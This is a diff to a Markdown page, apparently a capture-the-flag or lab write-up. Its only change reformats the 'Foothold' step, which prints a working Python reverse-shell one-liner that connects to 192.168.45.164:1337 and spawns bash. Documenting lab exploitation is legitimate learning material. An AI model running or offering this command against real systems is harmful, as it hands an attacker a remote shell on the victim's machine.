@@ -41,7 +41,7 @@
    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/16367f87-5490-46fd-9383-3668cf8a484d)
 
 ### Foothold
-- Popping a revshell with python3 code "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.164",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"
+- Popping a revshell with python3 code `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.164",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
   and stabilizing it
 
     ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/79d334c2-9911-401b-a69d-76220dc499bc)
